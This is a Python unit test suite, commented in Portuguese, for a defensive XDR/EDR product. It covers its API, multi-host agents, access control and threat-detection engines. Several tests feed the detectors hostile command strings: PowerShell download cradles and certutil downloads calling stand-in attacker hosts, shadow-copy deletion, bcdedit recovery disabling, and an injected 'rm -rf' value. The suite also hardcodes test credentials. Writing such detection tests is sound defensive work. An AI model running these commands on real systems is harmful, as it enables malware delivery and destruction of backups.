        self.assertEqual(res_rep.status_code, 200)
        rep_json = res_rep.get_json()
        self.assertIn("title", rep_json)
        self.assertIn("security_posture", rep_json)
        self.assertIn("integrity_sha256", rep_json)
        self.assertEqual(len(rep_json.get("integrity_sha256")), 64)

        # 5. Consulta de Relatório Forense Executivo Pronto para PDF (HTML A4)
        res_html = self.client.get("/api/reports/forensic/html")
        self.assertEqual(res_html.status_code, 200)
        self.assertIn(b"SENTINEL XDR", res_html.data)
        self.assertIn(b"window.print()", res_html.data)

    def test_10_thread_watchdog_auto_healing(self):
        """Valida a capacidade de auto-cura (self-healing) do SentinelThreadWatchdog."""
        from sentinela_service import SentinelThreadWatchdog
        import time

        watchdog = SentinelThreadWatchdog(check_interval=0.1)
        run_counter = [0]

        def flaky_worker():
            run_counter[0] += 1
            # Termina intencionalmente para acionar o watchdog
            return

        watchdog.register_thread("TestFlakyWorker", flaky_worker, daemon=True)
        watchdog.start()

        # Aguarda 2 ciclos de supervisão do watchdog
        time.sleep(0.35)
        watchdog.stop()

        self.assertGreaterEqual(watchdog.healed_count, 1)
    def test_11_sse_streaming_and_quarantine_inspect(self):
        """Valida o streaming SSE em tempo real e a inspeção forense de quarentena (Entropia & Strings)."""
        import os
        from sentinel_api import sse_broadcaster, calculate_shannon_entropy

        # 1. Valida cálculo matemático de entropia de Shannon
        low_ent = calculate_shannon_entropy(b"AAAAAAAABBBBBBBBCCCCCCCC")
        high_ent = calculate_shannon_entropy(os.urandom(1000))
        self.assertLess(low_ent, 2.0)
        self.assertGreater(high_ent, 7.0)

        # 2. Valida conexão e heartbeat SSE
        res_sse = self.client.get("/api/stream/events")
        self.assertEqual(res_sse.status_code, 200)
        self.assertEqual(res_sse.mimetype, "text/event-stream")

        # 3. Valida inspeção de quarentena com artefato contendo IOCs e comandos.
        #    O endpoint restringe a leitura de artefatos exclusivamente à pasta de
        #    quarentena oficial (mitigação anti path-traversal), portanto o teste
        #    deposita o artefato temporário nessa pasta e o remove ao final.
        from sentinel_api import BASE_DIR as sentinel_base_dir
        quarantine_dir = os.path.join(sentinel_base_dir, "quarantine")
        os.makedirs(quarantine_dir, exist_ok=True)
        sample_name = f"test_threat_{os.getpid()}_{int.__hash__(os.getpid()):x}.quarantine"
        sample_path = os.path.join(quarantine_dir, sample_name)
        with open(sample_path, "wb") as f:
            f.write(b"powershell.exe -w hidden -enc JABhID0... VirtualAlloc http://185.220.101.5/c2" + os.urandom(400))

        try:
            res_insp = self.client.get(f"/api/quarantine/inspect?file={sample_path}")
            self.assertEqual(res_insp.status_code, 200)
            data = res_insp.get_json()
            self.assertEqual(data.get("status"), "SUCCESS")
            self.assertIn("hashes", data)
            self.assertIn("entropy", data)
            self.assertIn("suspicious_indicators", data)
            self.assertGreater(data["entropy"]["global_shannon"], 5.0)
            self.assertIn("COMMANDS", data["suspicious_indicators"])
        finally:
            if os.path.exists(sample_path):
                os.remove(sample_path)


class TestSecurityHardening(unittest.TestCase):
    """Regressões das melhorias de segurança, robustez e conectividade."""

    def test_api_security_rejects_origin_prefix_bypass(self):
        """A validação de Origin deve usar parse real de URL (anti-bypass startswith)."""
        from sentinel_core.api_security import is_trusted_origin
        # Origens legítimas continuam aceitas
        self.assertTrue(is_trusted_origin("http://localhost:5000"))
        self.assertTrue(is_trusted_origin("http://127.0.0.1:5000"))
        self.assertTrue(is_trusted_origin("https://localhost"))
        self.assertTrue(is_trusted_origin("http://127.0.0.2"))
        self.assertTrue(is_trusted_origin("null"))
        self.assertTrue(is_trusted_origin(None))
        # Origens hostis mascaradas devem ser REJEITADAS
        self.assertFalse(is_trusted_origin("http://localhost.evil.com"))
        self.assertFalse(is_trusted_origin("http://127.0.0.1.evil.com"))
        self.assertFalse(is_trusted_origin("http://127.0.0.999"))
        self.assertFalse(is_trusted_origin("ftp://localhost"))
        self.assertFalse(is_trusted_origin("https://evil.com"))
        self.assertFalse(is_trusted_origin("http://localhost.@evil.com"))

    def test_firewall_refuses_private_and_invalid_ips(self):
        """O firewall não deve banir redes privadas/link-local nem IPs inválidos."""
        fw = OSFirewallManager(logger=None)
        self.assertFalse(fw.block_ip("192.168.1.50", reason="teste privado"))
        self.assertFalse(fw.block_ip("10.1.2.3", reason="teste privado"))
        self.assertFalse(fw.block_ip("169.254.10.1", reason="teste link-local"))
        self.assertFalse(fw.block_ip("999.1.1.1", reason="ip inválido"))
        self.assertFalse(fw.block_ip("not-an-ip; rm -rf", reason="injeção"))
        # IP público válido segue sendo bloqueado (na camada XDR Shield)
        try:
            self.assertTrue(fw.block_ip("45.146.164.110", reason="ransomware c2"))
        finally:
            fw.unblock_ip("45.146.164.110")

    def test_telemetry_includes_fim_metric(self):
        """O coletor de telemetria deve reportar a contagem de arquivos do FIM."""
        from sentinel_core.telemetry_collector import SentinelTelemetryCollector
        with tempfile.TemporaryDirectory() as tmp_prot:
            fim = FileIntegrityMonitor(watch_paths=[tmp_prot], auto_isolate=False)
            tc = SentinelTelemetryCollector(fim=fim)
            items = tc.collect_all()
            fim_items = [i for i in items if getattr(i, "item_id", "") == "sentinel.fim.files_monitored"]
            self.assertGreaterEqual(len(fim_items), 1)
            self.assertGreaterEqual(fim_items[0].value, 0)

    def test_dashboard_endpoints_resolve(self):
        """Valida que todos os endpoints referenciados pelo dashboard existem na API."""
        from sentinel_api import app as flask_api_app
        url_map = {str(r).split(" ")[0] for r in flask_api_app.url_map.iter_rules()}
        checked = [
            "/api/stats", "/api/logs", "/api/functions/alarms", "/api/functions/rules",
            "/api/system/architecture", "/api/intrusion/sensors", "/api/firewall/list",
            "/api/multiagent/agent_status", "/api/multiagent/hosts", "/api/multiagent/correlations",
            "/api/stream/events", "/api/rbac/me", "/api/ztna/status",
        ]
        for ep in checked:
            self.assertIn(ep, url_map, f"Endpoint {ep} não registrado")


class TestMultiAgentLayer(unittest.TestCase):
    """Valida a camada Multi-Host XDR (hub central + agentes federados)."""

    def setUp(self):
        from flask import Flask
        from multiagent import MultiAgentConfig, MultiAgentServer
        self.temp_dir = tempfile.mkdtemp()
        self.config = MultiAgentConfig(
            role="hub",
            agent_id="hub-test",
            state_dir=os.path.join(self.temp_dir, "state"),
            offline_timeout=20.0,
            mass_offline_threshold=2,
            incident_window=60.0,
        )
        self.flask_app = Flask(__name__)
        self.server = MultiAgentServer(self.config)
        self.server.init_app(self.flask_app)
        self.client = self.flask_app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_bus_local_queue(self):
        """Valida a fila thread-safe do barramento local do agente."""
        from multiagent import MultiAgentEventBus
        bus = MultiAgentEventBus(max_pending=5, flush_size=2)
        for i in range(7):
            bus.push("HIGH", "TEST", f"target-{i}", f"evento {i}")
        self.assertEqual(bus.pending, 5)  # max_pending respeitado (descarta o mais antigo)
        batch = bus.drain()
        self.assertEqual(len(batch), 2)   # flush_size default
        rest = bus.drain(100)
        self.assertEqual(len(rest), 3)

    def test_02_heartbeat_and_telemetry_endpoints(self):
        """Valida registro de heartbeat, telemetria e agregação no status do hub."""
        hb = self.client.post("/api/multiagent/heartbeat", json={
            "agent_id": "node-alpha", "hostname": "ALPHA-PC", "ip": "10.0.0.2",
            "platform": "Windows 11", "version": "2.1.0-MULTIHOST", "layers_active": 20,
        })
        self.assertEqual(hb.status_code, 200)
        self.assertEqual(hb.get_json()["status"], "success")

        tel = self.client.post("/api/multiagent/telemetry", json={
            "agent_id": "node-alpha", "metrics": {"cpu_util": 42.5, "memory_util": 61.0},
        })
        self.assertEqual(tel.status_code, 200)

        data = self.client.get("/api/multiagent/status").get_json()
        self.assertEqual(data["hosts_count"], 1)
        self.assertEqual(data["online_count"], 1)
        self.assertEqual(data["events_count"], 0)

        hosts = self.client.get("/api/multiagent/hosts").get_json()["hosts"]
        self.assertEqual(hosts[0]["agent_id"], "node-alpha")
        self.assertEqual(hosts[0]["metrics"]["cpu_util"], 42.5)
        self.assertTrue(hosts[0]["online"])

    def test_03_events_and_shared_ioc_correlation(self):
        """Dois hosts reportando o mesmo IOC público -> alerta de movimentação lateral."""
        import time
        for aid in ("node-alpha", "node-beta"):
            self.client.post("/api/multiagent/heartbeat", json={"agent_id": aid, "hostname": aid.upper()})
            self.client.post("/api/multiagent/events", json={
                "agent_id": aid,
                "events": [{
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "severity": "CRITICAL", "category": "C2",
                    "target": "cmd.exe", "description": "Beacon para 185.220.101.5",
                }],
            })
        corr = self.client.get("/api/multiagent/correlations").get_json()["correlations"]
        self.assertIn("SHARED_IOC_MULTIHOST", {c["rule"] for c in corr})
        events = self.client.get("/api/multiagent/events/list?limit=50").get_json()["events"]
        self.assertEqual(len(events), 2)

    def test_04_mass_offline_correlation(self):
        """Hosts conhecidos que param de enviar heartbeat -> alerta de interrupção em massa."""
        for aid in ("ghost-1", "ghost-2"):
            self.client.post("/api/multiagent/heartbeat", json={"agent_id": aid})
        # Simula que ambos pararam de responder (heartbeat no passado)
        for rec in self.server.registry._hosts.values():
            rec.last_heartbeat -= (self.config.offline_timeout + 5)
        alerts = self.server.registry.evaluate_correlations(
            window=self.config.incident_window,
            mass_offline_threshold=self.config.mass_offline_threshold,
        )
        self.assertTrue(any(a["rule"] == "MASS_OFFLINE" for a in alerts))

    def test_05_token_auth(self):
        """Valida autenticação por token compartilhado entre hub e agentes."""
        self.config.token = "s3cr3t-token"
        res_no = self.client.post("/api/multiagent/heartbeat", json={"agent_id": "x"})
        self.assertEqual(res_no.status_code, 401)
        res_ok = self.client.post(
            "/api/multiagent/heartbeat",
            json={"agent_id": "x"},
            headers={"X-Sentinel-Token": "s3cr3t-token"},
        )
        self.assertEqual(res_ok.status_code, 200)

    def test_06_state_persistence_roundtrip(self):
        """Valida persistência e restauração do estado do hub (hosts + eventos)."""
        self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-alpha", "hostname": "ALPHA"})
        self.client.post("/api/multiagent/events", json={
            "agent_id": "node-alpha",
            "events": [{"severity": "HIGH", "category": "TEST", "target": "t", "description": "d"}],
        })
        from multiagent import AgentRegistry
        reg2 = AgentRegistry(state_dir=self.config.state_dir)
        loaded = reg2.load_state()
        self.assertEqual(loaded, 1)
        rec = reg2.get("node-alpha")
        self.assertIsNotNone(rec)
        self.assertEqual(rec.events_count, 1)
        self.assertEqual(len(rec.events), 1)

    def test_07_remove_host_and_status_summary(self):
        """Valida remoção administrativa de host e o resumo consolidado do hub."""
        self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-alpha"})
        res = self.client.post("/api/multiagent/hosts/node-alpha/remove")
        self.assertEqual(res.get_json()["removed"], True)
        res2 = self.client.post("/api/multiagent/hosts/node-alpha/remove")
        self.assertEqual(res2.get_json()["status"], "not_found")
        summary = self.server.status_summary()
        self.assertEqual(summary["status"], "success")
        self.assertEqual(summary["hosts_count"], 0)

    def test_08_client_payload_and_lifecycle(self):
        """Valida construção do heartbeat e ciclo de vida do cliente multi-host."""
        from multiagent import MultiAgentClient, MultiAgentConfig
        cfg = MultiAgentConfig(
            role="agent", agent_id="unit-node",
            hub_url="http://127.0.0.1:1", heartbeat_interval=0.05,
        )
        cli = MultiAgentClient(cfg)
        hb = cli._build_heartbeat()
        self.assertEqual(hb["agent_id"], "unit-node")
        self.assertIn("ip", hb)
        self.assertIn("platform", hb)
        self.assertFalse(cli.running)
        cli.start()
        try:
            self.assertTrue(cli.running)
            cli.push_local_event("HIGH", "TEST", "t", "d")
            self.assertGreaterEqual(cli.bus.pending, 1)
        finally:
            cli.stop()
        self.assertFalse(cli.running)

    def test_09_api_security_csrf_protection(self):
        """Valida que requisições cross-site de origens não autorizadas são bloqueadas pelo guardião de CSRF."""
        sentinel_client = app.test_client()
        # Requisição de origem externa maliciosa deve receber 403 Forbidden
        res_blocked = sentinel_client.get("/api/health", headers={"Origin": "http://malicious-site.com"})
        self.assertEqual(res_blocked.status_code, 403)

        # Requisição legítima de localhost deve passar com 200 OK
        res_ok = sentinel_client.get("/api/health", headers={"Origin": "http://localhost:5000"})
        self.assertEqual(res_ok.status_code, 200)

    def test_10_fleet_policies_and_remote_isolation(self):
        """Valida a distribuição de políticas centrais da frota e isolamento remoto de host."""
        # 1. Obter políticas da frota
        res_pol = self.client.get("/api/multiagent/policies")
        self.assertEqual(res_pol.status_code, 200)
        pols = res_pol.get_json()
        self.assertIn("fleet_policies", pols)
        self.assertEqual(pols["fleet_policies"]["defense_mode"], "STANDARD")

        # 2. Atualizar política global (ex: modo lockdown e bloquear USB)
        up_res = self.client.post("/api/multiagent/policies", json={
            "defense_mode": "LOCKDOWN",
            "usb_policy": "BLOCK_ALL"
        })
        self.assertEqual(up_res.status_code, 200)
        updated = up_res.get_json()["fleet_policies"]
        self.assertEqual(updated["defense_mode"], "LOCKDOWN")
        self.assertEqual(updated["usb_policy"], "BLOCK_ALL")

        # 3. Registrar heartbeat de um nó e verificar que ele recebe a nova política
        hb = self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-delta"}).get_json()
        self.assertEqual(hb["policy"]["defense_mode"], "LOCKDOWN")
        self.assertFalse(hb["isolated"])

        # 4. Isolar remotamente o nó delta
        iso_res = self.client.post("/api/multiagent/hosts/node-delta/isolate")
        self.assertEqual(iso_res.status_code, 200)

        # 5. Heartbeat subsequente do nó delta agora deve retornar isolated: True
        hb2 = self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-delta"}).get_json()
        self.assertTrue(hb2["isolated"])

        # 6. Liberar isolamento
        uniso = self.client.post("/api/multiagent/hosts/node-delta/unisolate")
        self.assertEqual(uniso.status_code, 200)



class TestRBACLayer(unittest.TestCase):
    """Testes unitários para o motor RBAC e centro de controle de permissões."""

    def setUp(self):
        from sentinel_core.rbac_engine import RBACEngine
        self.rbac = RBACEngine()
        self.rbac.role_matrix = json.loads(json.dumps(self.rbac.DEFAULT_ROLE_MATRIX))
        if "analista_test" in self.rbac.users:
            del self.rbac.users["analista_test"]
        self.rbac.switch_profile("ADMIN")

    def tearDown(self):
        self.rbac.role_matrix = json.loads(json.dumps(self.rbac.DEFAULT_ROLE_MATRIX))
        if "analista_test" in self.rbac.users:
            del self.rbac.users["analista_test"]
        self.rbac.switch_profile("ADMIN")
        self.rbac._save_config()

    def test_01_default_roles_and_users(self):
        """Verifica a presença dos 3 níveis de acesso padrão: ADMIN, SUPPORT, USER."""
        cur = self.rbac.get_current_user()
        self.assertEqual(cur["role"], "ADMIN")
        self.assertTrue(cur["is_admin"])

        # Usuários padrão
        users = {u["id"]: u["role"] for u in self.rbac.list_users()}
        self.assertIn("admin", users)
        self.assertIn("suporte", users)
        self.assertIn("usuario", users)
        self.assertEqual(users["admin"], "ADMIN")
        self.assertEqual(users["suporte"], "SUPPORT")
        self.assertEqual(users["usuario"], "USER")

    def test_02_permission_matrix_evaluation(self):
        """Valida que permissões são concedidas e negadas de acordo com o papel."""
        # Admin tem tudo
        self.assertTrue(self.rbac.has_permission("act_kill_process", "ADMIN"))
        self.assertTrue(self.rbac.has_permission("act_manage_rbac", "ADMIN"))
        self.assertTrue(self.rbac.has_permission("view_settings", "ADMIN"))

        # Suporte pode matar processo mas não gerenciar RBAC nem configurações
        self.assertTrue(self.rbac.has_permission("act_kill_process", "SUPPORT"))
        self.assertFalse(self.rbac.has_permission("act_manage_rbac", "SUPPORT"))
        self.assertFalse(self.rbac.has_permission("view_settings", "SUPPORT"))

        # Usuário normal só tem leitura básica e varredura
        self.assertTrue(self.rbac.has_permission("view_overview", "USER"))
        self.assertTrue(self.rbac.has_permission("act_trigger_scan", "USER"))
        self.assertFalse(self.rbac.has_permission("act_kill_process", "USER"))
        self.assertFalse(self.rbac.has_permission("act_firewall_ban", "USER"))
        self.assertFalse(self.rbac.has_permission("view_fleet", "USER"))

    def test_03_switch_profile_and_authentication(self):
        """Testa alternância de sessão e autenticação de credenciais."""
        # Alternar para Suporte
        res_supp = self.rbac.switch_profile("SUPPORT")
        self.assertEqual(res_supp["status"], "success")
        self.assertEqual(self.rbac.get_current_user()["role"], "SUPPORT")

        # Autenticação correta
        session = self.rbac.authenticate("admin", "admin123")
        self.assertIsNotNone(session)
        self.assertIn("token", session)

        # Autenticação errada
        bad = self.rbac.authenticate("admin", "senha_errada")
        self.assertIsNone(bad)

    def test_04_matrix_update_by_admin(self):
        """Valida a customização dinâmica da matriz de permissões pelo Admin."""
        # Admin concede permissão 'view_fleet' ao papel USER
        cur_user_views = list(self.rbac.role_matrix["USER"]["views"])
        if "view_fleet" not in cur_user_views:
            cur_user_views.append("view_fleet")

        ok = self.rbac.update_role_permissions("USER", cur_user_views, ["act_trigger_scan"], requester_role="ADMIN")
        self.assertTrue(ok)
        self.assertTrue(self.rbac.has_permission("view_fleet", "USER"))

        # Tentativa de alteração por não-admin é recusada
        ok_denied = self.rbac.update_role_permissions("USER", [], [], requester_role="SUPPORT")
        self.assertFalse(ok_denied)

    def test_05_create_new_operator(self):
        """Cadastra um novo analista no sistema."""
        res = self.rbac.create_user("analista_test", "Analista Teste", "senha123", "SUPPORT", requester_role="ADMIN")
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["user"]["role"], "SUPPORT")

        # Verificar se está na lista
        uids = [u["id"] for u in self.rbac.list_users()]
        self.assertIn("analista_test", uids)



class TestCuttingEdgeEngines(unittest.TestCase):
    """Testes unitários dos 4 novos motores de ponta: AMSI Guard, VSS Shield, RWX Hunter, CISA KEV."""

    def test_01_amsi_script_guard(self):
        """Valida o motor AMSI de inspeção, desofuscação e bloqueio de cradles fileless."""
        from sentinel_core.amsi_guard import AMSIScriptGuard
        amsi = AMSIScriptGuard()

        # Script benigno
        res_ok = amsi.inspect_script_content("Get-Process | Where-Object { $_.CPU -gt 10 }")
        self.assertFalse(res_ok["is_malicious"])
        self.assertEqual(res_ok["status"], "allowed")

        # Script malicioso ofuscado (DownloadString cradle)
        res_bad = amsi.inspect_script_content("IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/payload.ps1')")
        self.assertTrue(res_bad["is_malicious"])
        self.assertEqual(res_bad["status"], "blocked")

        # Desofuscação de backticks
        deobf = amsi.deobfuscate_buffer("`I`E`X(`d`o`w`n`l`o`a`d`s`t`r`i`n`g)")
        self.assertIn("IEX(downloadstring)", deobf)

    def test_02_ransomware_vss_shield(self):
        """Valida o escudo Anti-Ransomware contra destruição de Shadow Copies e BCDEdit."""
        from sentinel_core.ransomware_vss_shield import RansomwareVSSShield
        vss = RansomwareVSSShield()

        # Comando benigno
        res_ok = vss.inspect_command("ipconfig /all")
        self.assertFalse(res_ok["blocked"])

        # Destruição de Shadow Copies clássica de Ransomware
        res_bad1 = vss.inspect_command("vssadmin.exe delete shadows /all /quiet")
        self.assertTrue(res_bad1["blocked"])
        self.assertEqual(res_bad1["rule_id"], "VSS-001")

        # Destruição via WMIC
        res_bad2 = vss.inspect_command("wmic shadowcopy delete")
        self.assertTrue(res_bad2["blocked"])
        self.assertEqual(res_bad2["rule_id"], "VSS-002")

        # Desativação de modo de recuperação no BCDEdit
        res_bad3 = vss.inspect_command("bcdedit /set {default} recoveryenabled No")
        self.assertTrue(res_bad3["blocked"])
        self.assertEqual(res_bad3["rule_id"], "VSS-004")

    def test_03_memory_rwx_hunter(self):
        """Valida o caçador de páginas RWX e shellcode unbacked."""
        from sentinel_core.memory_rwx_hunter import MemoryRWXHunter
        rwx = MemoryRWXHunter()

        status = rwx.get_status()
        self.assertEqual(status["status"], "active")
        self.assertGreaterEqual(status["beacon_signatures_loaded"], 4)

        # Varredura do processo atual do Python
        import os
        res_self = rwx.scan_process_memory(os.getpid())
        self.assertEqual(res_self["status"], "success")

    def test_04_cisa_kev_vulnerability_engine(self):
        """Valida a auditoria de vulnerabilidades KEV e fraquezas de configuração."""
        from sentinel_core.cisa_kev_engine import CISAKEVEngine
        kev = CISAKEVEngine()

        audit = kev.run_vulnerability_audit()
        self.assertEqual(audit["status"], "success")
        self.assertGreaterEqual(audit["vulnerability_score"], 80)
        self.assertIn("findings", audit)
        self.assertGreaterEqual(len(audit["findings"]), 5)

        # Teste de remediação
        rem = kev.remediate_finding("KEV-005")
        self.assertEqual(rem["status"], "success")



class TestSTIXMISPLayer(unittest.TestCase):
    """Testes unitários do motor STIX 2.1 / MISP CTI e do Threat Watchdog Daemon."""

    def test_01_stix_bundle_parsing_and_indexing(self):
        """Valida a indexação O(1) de objetos STIX 2.1."""
        from sentinel_core.stix_misp_engine import STIXMISPEngine
        engine = STIXMISPEngine()
        status = engine.get_status()
        self.assertEqual(status["status"], "active")
        self.assertGreaterEqual(status["total_iocs"], 4)
        self.assertGreaterEqual(status["ips_indexed"], 2)
        self.assertGreaterEqual(status["domains_indexed"], 1)
        self.assertGreaterEqual(status["hashes_indexed"], 1)

    def test_02_stix_ioc_lookup(self):
        """Valida a consulta rápida de IPs de C2, domínios e hashes."""
        from sentinel_core.stix_misp_engine import STIXMISPEngine
        engine = STIXMISPEngine()

        # IP de C2 conhecido
        match_ip = engine.lookup_ioc("185.220.101.5")
        self.assertIsNotNone(match_ip)
        self.assertTrue(match_ip["match"])
        self.assertEqual(match_ip["type"], "ip")

        # Domínio C2 conhecido
        match_dom = engine.lookup_ioc("cobaltstrike-c2.ru")
        self.assertIsNotNone(match_dom)
        self.assertTrue(match_dom["match"])
        self.assertEqual(match_dom["type"], "domain")

        # Subdomínio de C2 conhecido
        match_sub = engine.lookup_ioc("beacon1.cobaltstrike-c2.ru")
        self.assertIsNotNone(match_sub)
        self.assertTrue(match_sub["match"])

        # Valor limpo
        clean = engine.lookup_ioc("8.8.8.8")
        self.assertIsNone(clean)

    def test_03_stix_sync_feeds(self):
        """Valida a sincronização com novos feeds CTI globais."""
        from sentinel_core.stix_misp_engine import STIXMISPEngine
        engine = STIXMISPEngine()
        initial = engine.total_iocs_count
        new_total = engine.sync_global_feeds()
        self.assertGreaterEqual(new_total, initial)

    def test_04_threat_watchdog_single_cycle(self):
        """Valida a execução de um ciclo autônomo do ThreatWatchdogDaemon."""
        from sentinel_core.stix_misp_engine import STIXMISPEngine
        from sentinel_core.memory_rwx_hunter import MemoryRWXHunter
        from sentinel_core.ransomware_vss_shield import RansomwareVSSShield
        from sentinel_core.amsi_guard import AMSIScriptGuard
        from sentinel_core.threat_watchdog_daemon import ThreatWatchdogDaemon

        stix = STIXMISPEngine()
        rwx = MemoryRWXHunter()
        vss = RansomwareVSSShield()
        amsi = AMSIScriptGuard()

        watchdog = ThreatWatchdogDaemon(
            rwx_hunter=rwx,
            stix_engine=stix,
            vss_shield=vss,
            amsi_guard=amsi
        )

        res = watchdog.execute_single_cycle()
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["cycle"], 1)
        self.assertIn("findings_count", res)



class TestEnterpriseEnginesSuite(unittest.TestCase):
    """Testes unitários dos 8 novos motores de nível Enterprise do Sentinela XDR."""

    def test_01_lolbas_guard(self):
        """Valida o bloqueio de técnicas LOLBAS com certutil, mshta e rundll32."""
        from sentinel_core.lolbas_guard import LOLBASGuard
        lolbas = LOLBASGuard()

        # Comando benigno
        res_ok = lolbas.inspect_process_execution(r"notepad.exe C:\Users\report.txt")
        self.assertFalse(res_ok["blocked"])

        # Abuso de certutil para download de malware
        res_bad = lolbas.inspect_process_execution("certutil.exe -urlcache -split -f http://evil.com/x.exe")
        self.assertTrue(res_bad["blocked"])
        self.assertEqual(res_bad["rule_id"], "LOLBAS-001")

    def test_02_ransomware_honeyfiles(self):
        """Valida as armadilhas tripwire de ransomware."""
        from sentinel_core.ransomware_honeyfiles import RansomwareHoneyfiles
        hf = RansomwareHoneyfiles(base_dir="test_honeyfiles_suite")
        res = hf.check_integrity()
        self.assertFalse(res["has_threat"])
        self.assertEqual(res["status"], "secure")
        self.assertGreaterEqual(res["total_monitored"], 3)

    def test_03_itdr_kerberos_guard(self):
        """Valida a detecção de Kerberoasting e DCSync."""
        from sentinel_core.itdr_kerberos_guard import ITDRKerberosGuard
        itdr = ITDRKerberosGuard()

        # Detecção de Kerberoasting
        res_kb = itdr.inspect_kerberos_ticket(spn="MSSQLSvc/db:1433", encryption_type="rc4-hmac", account_name="svc_sql")
        self.assertTrue(res_kb["is_threat"])
        self.assertEqual(res_kb["attack_type"], "KERBEROASTING")

        # Detecção de DCSync
        res_dc = itdr.inspect_ad_replication(source_ip="10.0.0.50", user_principal="fake_admin", is_domain_controller=False)
        self.assertTrue(res_dc["is_threat"])
        self.assertEqual(res_dc["attack_type"], "DCSYNC")

    def test_04_live_forensics_dumper(self):
        """Valida a geração de dumps forenses cirúrgicos."""
        import os
        from sentinel_core.live_forensics_dumper import LiveForensicsDumper
        dumper = LiveForensicsDumper(output_dir="test_forensics_suite")
        res = dumper.dump_and_analyze_process(os.getpid())
        self.assertEqual(res["status"], "success")
        self.assertIn("package", res)
        self.assertIn("report", res)

    def test_05_native_etw_sensor(self):
        """Valida a ingestão de telemetria nativa ETW do Kernel."""
        from sentinel_core.native_etw_sensor import NativeETWSensor
        etw = NativeETWSensor()
        status = etw.get_status()
        self.assertEqual(status["status"], "active")
        self.assertEqual(status["providers_count"], 3)

        res = etw.ingest_kernel_event("Microsoft-Windows-Threat-Intelligence", "VirtualAllocRemote", 9999, {"target": 1000})
        self.assertTrue(res["is_suspicious"])

    def test_06_sigma_compiler(self):
        """Valida a compilação e avaliação nativa de regras Sigma universais."""
        from sentinel_core.sigma_compiler_engine import SigmaCompilerEngine
        sigma = SigmaCompilerEngine()
        status = sigma.get_status()
        self.assertEqual(status["status"], "active")
        self.assertGreaterEqual(status["compiled_rules_count"], 3)

        res = sigma.evaluate_event({"CommandLine": "powershell.exe IEX(DownloadString)"})
        self.assertTrue(res["has_match"])

    def test_07_mini_nids_dpi(self):
        """Valida o Mini-NIDS e inspeção profunda de pacotes."""
        from sentinel_core.mini_nids_dpi import MiniNIDSDPI
        nids = MiniNIDSDPI()

        # Scanner de ataque
        res_scanner = nids.inspect_http_traffic("Mozilla/5.0 sqlmap/1.5", "/test")
        self.assertTrue(res_scanner["is_anomaly"])
        self.assertEqual(res_scanner["scanner"], "sqlmap")

    def test_08_cloud_k8s_guard(self):
        """Valida a proteção de postura de nuvem e containers."""
        from sentinel_core.cloud_k8s_guard import CloudK8sGuard
        cloud = CloudK8sGuard()

        # Tentativa de acesso a endpoint IMDS
        res_imds = cloud.inspect_imds_metadata_query("169.254.169.254", "curl.exe", 1234)
        self.assertTrue(res_imds["is_threat"])
        self.assertEqual(res_imds["type"], "CLOUD_IMDS_SSRF_PROBE")

        # Auditoria de postura
        res_audit = cloud.audit_container_runtime()
        self.assertEqual(res_audit["status"], "success")
        self.assertEqual(res_audit["score"], 100)

    def test_09_anti_invasion_suite(self):
        """Valida os 5 novos motores soberanos de anti-invasão."""
        from sentinel_core.hook_integrity_guard import HookIntegrityGuard
        from sentinel_core.c2_beacon_hunter import C2BeaconHunter
        from sentinel_core.token_armor_guard import TokenArmorGuard
        from sentinel_core.reverse_shell_guard import ReverseShellGuard
        from sentinel_core.portscan_disruptor import PortScanDisruptor

        # 1. Hook Integrity Guard
        hook_guard = HookIntegrityGuard()
        self.assertTrue(hook_guard.get_status()["is_active"])
        sim_hook = hook_guard.simulate_tamper_event()
        self.assertEqual(sim_hook["severity"], "CRITICAL")
        self.assertEqual(sim_hook["reason"], "UNAUTHORIZED_TRAMPOLINE_JMP")

        # 2. C2 Beacon Hunter
        c2_hunter = C2BeaconHunter()
        self.assertTrue(c2_hunter.get_status()["is_active"])
        sim_c2 = c2_hunter.simulate_c2_stream()
        self.assertIn(sim_c2["pattern_type"], ["JITTERED_C2_HEARTBEAT", "STRICT_PERIODIC_BEACON"])
        self.assertGreaterEqual(sim_c2["beacon_score"], 70.0)

        # 3. Token Armor Guard
        token_armor = TokenArmorGuard()
        self.assertTrue(token_armor.get_status()["is_active"])
        sim_token = token_armor.simulate_potato_attack()
        self.assertEqual(sim_token["attack_type"], "POTATO_PRIVILEGE_ESCALATION")

        # 4. Reverse Shell Guard
        rev_shell = ReverseShellGuard()
        self.assertTrue(rev_shell.get_status()["is_active"])
        sim_shell = rev_shell.simulate_reverse_shell()
        self.assertEqual(sim_shell["severity"], "CRITICAL")

        # 5. PortScan Disruptor
        portscan = PortScanDisruptor()
        self.assertTrue(portscan.get_status()["is_active"])
        sim_scan = portscan.simulate_stealth_scan("203.0.113.99")
        self.assertEqual(sim_scan["mitre"], "T1046")
        self.assertGreaterEqual(sim_scan["ports_count"], 5)

    def test_10_strategic_improvements_suite(self):
        """Valida o pacote de melhorias estratégicas: Árvore de Processos, Ofuscação IA, Broadcast de IOCs e Isolamento Granular."""
        from sentinel_core.command_obfuscation_classifier import CommandObfuscationClassifier
        from sentinel_core.process_guard import EDRProcessGuard
        from sentinel_core.zero_trust_wfp import ZeroTrustNetworkEngine
        from multiagent.agent import MultiAgentClient
        from multiagent.config import MultiAgentConfig
        from sentinel_api import app as flask_api_app

        # 1. Classificador de Ofuscação de Comandos
        classifier = CommandObfuscationClassifier()
        legit = classifier.analyze_command("notepad.exe C:\\relatorio.txt")
        self.assertFalse(legit["is_obfuscated"])
        self.assertEqual(legit["risk_level"], "LOW")

        obf_caret = classifier.analyze_command("c^m^d.e^x^e /c s^e^t p=1")
        self.assertIn("CMD_CARET_ESCAPE_INJECTION", " ".join(obf_caret["indicators"]))

        obf_backtick = classifier.analyze_command("p`o`w`e`r`s`h`e`l`l.exe -NoP -w hidden")
        self.assertIn("POWERSHELL_BACKTICK_OBFUSCATION", " ".join(obf_backtick["indicators"]))

        obf_b64 = classifier.analyze_command("powershell.exe -enc aW52b2tlLWV4cHJlc3Npb24gImhlbGxvIg==")
        self.assertIn("BASE64_ENCODED_COMMAND_EXECUTION", " ".join(obf_b64["indicators"]))
